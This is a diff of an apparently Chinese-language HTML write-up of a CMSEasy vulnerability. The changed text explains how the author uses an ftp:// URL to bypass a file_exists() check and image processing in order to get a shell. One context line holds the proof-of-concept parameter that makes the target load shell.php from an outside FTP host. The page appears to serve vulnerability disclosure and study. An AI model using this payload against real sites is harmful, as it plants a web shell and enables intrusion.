@@ -208,9 +208,11 @@ $new_name = $new_name_gbk = str_replace('.','',Time::getMicrotime()).'.'.end(exp
                 <div class="row">
                     <div class="col-lg-12">
                         <p class="lead">                            
-                            於是乎作者用了一個很棒的方法，<del>既然一個麵包吃不夠，就吃兩個蛋糕啊</del><br>
-                            既然 http 不行，那我用 ftp 啊 (笑)，於是乎，作者就用 ftp 去繞過 file_exits()
-
+                            作者為了避免圖片在上傳時，我們塞 Payload 的圖片被圖片處理的 function 改掉<br>
+                            導致準備上傳的圖片，沒有辦法順利 get shell ，用了一個很棒的方法<br>
+                            <del>既然一個麵包吃不夠，就吃兩個蛋糕啊</del><br>
+                            既然 http 不行，那用 ftp 啊 (笑)，於是乎，作者就用 ftp 去繞過 file_exits()<br>
+                            而且 file_exits() 這 function 在 PHP 5.0.0 版本時就出現了
                         </p>
                     </div>
                 </div>
@@ -307,7 +309,7 @@ $new_name = $new_name_gbk = str_replace('.','',Time::getMicrotime()).'.'.end(exp
                 <div class="row">
                     <div class="col-lg-12">
                         <p class="lead"> 
-                             以作者本身的範例 "<font color="blue">http://192.168.1.170/cmseasy</font> " 來說，作者的POC 就是...
+                             以作者本身的範例 "<font color="blue">http://192.168.1.170/cmseasy</font> " 來說，作者的 POC 就是...
                         </p>
                     </div>
                 </div>
@@ -334,6 +336,13 @@ pic=111111111ftp://ludas.pw/shell.php&w=228&h=146&x1=0&x2=228&y1=0&y2=146
                     <div class="col-lg-2"></div>
                 </div><br>
 
+                <div class="row">
+                    <div class="col-lg-12">
+                        <p class="lead"> 
+                             
+                        </p>
+                    </div>
+                </div>
 
                 <!-- Page Contect End -->
             </div>
